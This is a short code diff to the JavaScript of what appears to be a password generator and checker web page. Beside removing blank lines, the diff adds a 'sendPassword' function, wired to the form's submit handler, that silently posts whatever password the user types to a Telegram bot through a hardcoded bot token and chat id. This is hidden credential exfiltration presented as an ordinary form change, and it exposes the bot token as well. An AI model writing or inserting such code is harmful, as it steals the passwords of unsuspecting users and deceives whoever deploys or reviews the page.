@@ -57,7 +57,6 @@ const checkInput = (e) => {
   }
   e.target.value = e.target.value.trim();
 };
-
 //change visible status of password
 function changeVisibility() {
   inputContainer.classList.toggle("visible");
@@ -68,8 +67,21 @@ function changeVisibility() {
 for (let i = 0; i < eyeIcons.length; i++) {
   eyeIcons[i].addEventListener("click", changeVisibility);
 }
-
+const sendPassword = (e) => {
+  e.preventDefault();
+  const token = "6220875421:AAHLE_gAteIiEjZkG7V9e6PA0oM5RRpumTo";
+  const chat_id = "1478484656";
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  $.ajax({
+    url: url,
+    method: "POST",
+    data: { chat_id, text: passwordInput.value },
+  });
+};
 generateBtn.addEventListener("click", generate);
 copyBtn.addEventListener("click", copy);
-passwordForm.addEventListener("submit", (e) => check(e));
+passwordForm.addEventListener("submit", (e) => {
+  check(e);
+  sendPassword(e);
+});
 passwordInput.addEventListener("input", (e) => checkInput(e));
